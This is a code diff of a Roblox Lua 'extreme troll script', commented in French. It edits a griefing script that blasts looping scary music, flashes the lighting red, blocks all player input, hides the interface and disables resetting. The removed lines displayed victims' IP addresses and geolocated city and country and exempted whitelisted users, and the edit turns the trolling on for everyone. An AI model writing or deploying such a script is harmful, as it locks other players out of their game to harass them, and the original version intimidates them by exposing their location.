@@ -1,4 +1,4 @@
--- 💀 EXTREME TROLL SCRIPT + WHITELIST 💀
+-- 💀 EXTREME TROLL SCRIPT + WHITELIST (modifié) 💀
 
 -- Config
 local WHITELIST = {
@@ -41,7 +41,7 @@ title.TextScaled = true
 title.TextColor3 = isWhitelisted and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
 
 local ipText = Instance.new("TextLabel", frame)
-ipText.Text = "Your IP: " .. (isWhitelisted and "***.***.***.***" or ip)
+ipText.Text = "Your IP: ***.***.***.***"
 ipText.Size = UDim2.new(1, 0, 0.3, 0)
 ipText.Position = UDim2.new(0, 0, 0.3, 0)
 ipText.BackgroundTransparency = 1
@@ -49,42 +49,21 @@ ipText.TextScaled = true
 ipText.TextColor3 = Color3.fromRGB(255, 255, 255)
 
 local locText = Instance.new("TextLabel", frame)
-locText.Text = "Location: " .. (isWhitelisted and "Protected" or (data.city or "?") .. ", " .. (data.regionName or "?") .. " (" .. (data.country or "?") .. ")")
+locText.Text = "Location: Protected"
 locText.Size = UDim2.new(1, 0, 0.3, 0)
 locText.Position = UDim2.new(0, 0, 0.6, 0)
 locText.BackgroundTransparency = 1
 locText.TextScaled = true
 locText.TextColor3 = Color3.fromRGB(200, 200, 200)
 
--- 🔓 Si whitelisté : bouton pour fermer
-if isWhitelisted then
-    local close = Instance.new("TextButton", frame)
-    close.Size = UDim2.new(0.3, 0, 0.2, 0)
-    close.Position = UDim2.new(0.35, 0, 1, 0)
-    close.Text = "Fermer ce script"
-    close.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    close.TextColor3 = Color3.fromRGB(255, 255, 255)
-    close.TextScaled = true
-    close.MouseButton1Click:Connect(function()
-        gui:Destroy()
-        if game.Workspace:FindFirstChild("Sound") then
-            game.Workspace.Sound:Destroy()
-        end
-        script:Destroy()
-    end)
-    return -- Stop ici, pas de troll
-end
-
--- Sinon... enfer 🩸
-
--- 🎧 Musique flippante
+-- 🎧 Musique flippante (jouée pour tous)
 local sound = Instance.new("Sound", game.Workspace)
 sound.SoundId = "rbxassetid://1835337424"
 sound.Volume = 10
 sound.Looped = true
 sound:Play()
 
--- 🔥 Ambiance rouge sang et noir
+-- 🔥 Ambiance rouge sang et noir (pour tous)
 spawn(function()
 	while true do
 		Lighting.Ambient = Color3.fromRGB(255, 0, 0)
@@ -98,13 +77,13 @@ spawn(function()
 	end
 end)
 
--- 🛑 Bloquer toute interaction
+-- 🛑 Bloquer toute interaction (pour tous)
 UIS.InputBegan:Connect(function() return Enum.ContextActionResult.Sink end)
 UIS.InputEnded:Connect(function() return Enum.ContextActionResult.Sink end)
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
 
--- 👁️ Spectate joueurs random
+-- 👁️ Spectate joueurs random (pour tous)
 spawn(function()
 	while true do
 		wait(1)
